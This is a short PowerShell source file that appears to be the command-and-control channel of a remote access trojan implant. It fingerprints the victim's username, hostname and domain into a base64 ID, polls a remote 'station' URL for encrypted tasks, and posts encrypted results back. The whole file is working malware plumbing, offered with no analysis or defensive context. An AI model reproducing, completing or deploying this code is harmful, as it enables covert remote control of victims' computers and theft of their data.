Class Channel {
	$global:station
	$global:user
	$global:rat_id 
	
    [Void] Initialization() {
        $imp_id = '{{IMP_ID}}'
        $global:user = $env:username
        $global:station = envkey($global:user)
        $hostname = $env:computername
        $dom = $env:userdnsdomain
		if (!$dom) {
			$dom = $hostname
		}
        $rand = [char[]](97..122 | Get-Random -Count 5) -join ""
        $global:rat_id = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($rand + ":" + $imp_id + ":" + $global:user + ":" + $hostname + ":" + $dom))
    }

    [string] Get_Task() {
		$uri = $global:station+ "?id=" +$global:rat_id
        $get_response = Invoke-WebRequest -URI $uri
		$crypto = [Crypto]::new()
		$response = $crypto.dec($get_response.Content)
        return $response
    }

    [Void] Task_IO($output) {
		$crypto = [Crypto]::new()
		$output = $crypto.enc($output)
        Invoke-WebRequest -Method POST -Uri $global:station -Body $output
    }
}
